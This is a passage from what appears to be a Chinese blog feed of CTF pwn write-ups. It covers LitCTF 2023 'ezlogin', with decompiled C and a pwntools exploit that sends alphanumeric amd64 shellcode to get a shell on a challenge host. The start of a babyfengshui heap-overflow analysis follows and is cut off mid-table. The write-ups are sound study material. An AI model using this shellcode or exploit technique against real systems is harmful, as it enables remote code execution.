  &#125;</span><br><span class="line">        v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dest )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个判断就占大部分的代码段，建议放在逆向里（bushi</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )    <span class="comment">//判断次数即遍历次数</span></span><br><span class="line">    qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sb )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">*sb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">    *sc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( !*sc )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">    qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sd )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">*sd = <span class="number">0</span>;</span><br><span class="line">ptr = sd + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">    *ptr++ = <span class="number">0</span>;</span><br><span class="line">ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>首先qword_202040数组的第一个参数是传进来的字符串的开头，然后sb便是字符串中<code>：</code>的下一个字符，之后sc就是sb之后的正常的可读字符，然后qword_202040的第二个参数就是sc，即<code>：</code>后的可读字符，然后再找到sc之后即：后面的一个<code>\n</code>，存进sd里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = atoi(nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dest )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">&#125;</span><br><span class="line">++v8;</span><br></pre></td></tr></table></figure><p>之后就是判断字符串的开头必须是msg或者opt然后跟上<code>：</code>，<code>：</code>之后就是dest或v7的值</p><p>从而得知格式要求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt:v7\nmsg:dest\n  或者msg:dest\nopt:v7\n</span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();</span><br><span class="line">    dest = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">char</span> *)&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求是unk_202024这个上面的值要为真，进而会执行dest上的函数，之前的mmap是为了让执行段可执行，映射到内存里，不然一直都在栈上显然是不可以执行的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然要先传进去ro0t但是它上面传输的字节其实是少传一个字节因此要多传一个无用字节</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./login2&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28735</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;msg:ro0tt\nopt:1\n&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;opt:2\nmsg:&#x27;</span>+amd64shell+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">ru(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;刷题记录2&quot;&gt;&lt;a href=&quot;#刷题记录2&quot; class=&quot;headerlink&quot; title=&quot;刷题记录2&quot;&gt;&lt;/a&gt;刷题记录2&lt;/h1&gt;&lt;h1 id=&quot;LitCTF-2023-ezlogin&quot;&gt;&lt;a href=&quot;#LitCTF-2023-ezlogin&quot; c</summary>
      
    
    
    
    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>题录1.0</title>
    <link href="http://s1nec-1o.github.io/2024/05/12/%E9%A2%98%E5%BD%951-0/"/>
    <id>http://s1nec-1o.github.io/2024/05/12/%E9%A2%98%E5%BD%951-0/</id>
    <published>2024-05-12T08:48:29.000Z</published>
    <updated>2024-05-12T08:53:49.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="刷题记录1"><a href="#刷题记录1" class="headerlink" title="刷题记录1"></a>刷题记录1</h1><p>因为国赛将近，开始每天几道题，难度不等，之后会有patch的使用（算是预告和DIR-815的复现（早就复现一直没时间详细写</p><h1 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653175.png" alt="image-20240507223850443"></p><p>是一道风水题，可以拿来找回感觉</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;0: Add a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Delete a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Display a user&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Update a user description&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Action: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size of description: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, v2, &amp;v0);</span><br><span class="line">      add(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      delete(LOBYTE(v2[<span class="number">0</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      show(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">      edit(v2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)byte_804B069 &gt; <span class="number">0x31</span>u )<span class="comment">// 有限制</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;maximum capacity exceeded, bye&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个很常规的菜单堆</p><p>可以分析出一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* description;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x7f</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他是首先会malloc一个堆作为存储des，然后再malloc 0x80来存储name和des堆的地址</p><p>主要的漏洞点在于edit函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_8048724</span><span class="params">(<span class="type">unsigned</span> __int8 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; (<span class="type">unsigned</span> __int8)byte_804B069 &amp;&amp; *(&amp;ptr + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="type">char</span> *)*(&amp;ptr + a1) - <span class="number">4</span> )<span class="comment">// 保证des的heap地址小于总heap地址</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    fgets_1(*(<span class="type">char</span> **)*(&amp;ptr + a1), v3 + <span class="number">1</span>);    <span class="comment">// v3可改说明堆溢出，但是要绕过上述的if</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他的数据判断主要是通过地址的判断</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>1.首先申请连续的3个结构体，description部分空间大小为0x80，方便计算：</p><table><thead><tr><th>堆块0 des 0x80</th><th>堆块0 node 0x80</th><th>堆块1 des 0x80</th><th>堆块1 node 0x80</th><th>堆块2 des 0x8</th><th>堆块2 node 0x80</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>2.释放第一个结构体，得到一个空闲的0x100的堆块：</p><table><thead><tr><th>空闲堆块0 x100</th><th>堆块1 des 0x80</th><th>堆块1 node 0x80</th><th>堆块2 des 0x8</th><th>堆块2 node 